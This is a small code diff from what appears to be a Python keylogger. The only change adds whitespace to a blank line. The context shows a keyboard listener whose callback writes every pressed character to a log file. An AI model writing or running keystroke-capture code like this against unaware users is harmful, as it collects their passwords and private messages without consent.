@@ -8,7 +8,7 @@ def keyPressed(key):
             logKey.write(char)
         except:
             print("Error getting char")
-
+            
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
